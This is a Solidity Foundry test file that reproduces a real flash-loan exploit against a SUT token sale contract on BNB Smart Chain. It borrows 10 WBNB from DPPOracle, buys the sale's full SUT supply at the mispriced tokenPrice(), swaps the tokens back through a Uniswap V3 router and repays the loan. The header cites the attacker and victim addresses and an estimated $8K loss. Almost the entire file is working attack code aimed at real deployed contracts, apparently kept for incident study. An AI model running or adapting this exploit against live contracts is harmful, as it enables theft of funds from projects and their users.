// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~8K USD$
// Attacker : https://bscscan.com/address/0x547fb3db0f13eed5d3ff930a0b61ae35b173b4b5
// Attack Contract : https://bscscan.com/address/0x9be508ce41ae5795e1ebc247101c40da7d5742db
// Vulnerable Contract : https://bscscan.com/address/0xf075c5c7ba59208c0b9c41afccd1f60da9ec9c37
// Attack Tx : https://bscscan.com/tx/0xfa1ece5381b9e2b2b83cb10faefde7632ca411bb38dd6bafe1f1140b1360f6ae

// @Analysis
// https://twitter.com/bulu4477/status/1682983956080377857

interface IUniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}

interface ISUTTokenSale {
    function tokenPrice() external view returns (uint256);

    function buyTokens(uint256 _numberOfTokens) external payable;
}

contract SUTTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 SUT = IERC20(0x70E1bc7E53EAa96B74Fad1696C29459829509bE2);
    IUniswapV3Router Router = IUniswapV3Router(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
    IDPPOracle DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    ISUTTokenSale SUTTokenSale = ISUTTokenSale(0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 30_165_901);
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(SUT), "SUT");
        cheats.label(address(Router), "Router");
        cheats.label(address(DPPOracle), "DPPOracle");
        cheats.label(address(SUTTokenSale), "SUTTokenSale");
    }

    function testExploit() public {
        // Start with 0 BNB
        deal(address(this), 0 ether);
        // Take 10 WBNB loan
        DPPOracle.flashLoan(10e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        SUT.approve(address(Router), type(uint256).max);
        WBNB.withdraw(10e18);

        emit log_named_uint("Incorrect SUT token price returned from tokenPrice() function", SUTTokenSale.tokenPrice());

        SUTTokenSale.buyTokens{value: 6.855184233076263744 ether}(SUT.balanceOf(address(SUTTokenSale)));

        emit log_named_decimal_uint("Buyed number of SUT tokens", SUT.balanceOf(address(this)), 18);

        // Swap all SUT tokens to WBNB
        SUTToWBNB();

        // Wrap the remaining BNB (after buying SUT tokens) to WBNB
        WBNB.deposit{value: address(this).balance}();

        // Repaying flashloan
        WBNB.transfer(address(DPPOracle), baseAmount);
    }

    receive() external payable {}

    function SUTToWBNB() internal {
        IUniswapV3Router.ExactInputSingleParams memory params = IUniswapV3Router.ExactInputSingleParams({
            tokenIn: address(SUT),
            tokenOut: address(WBNB),
            fee: 2500,
            recipient: address(this),
            amountIn: SUT.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(params);
    }
}
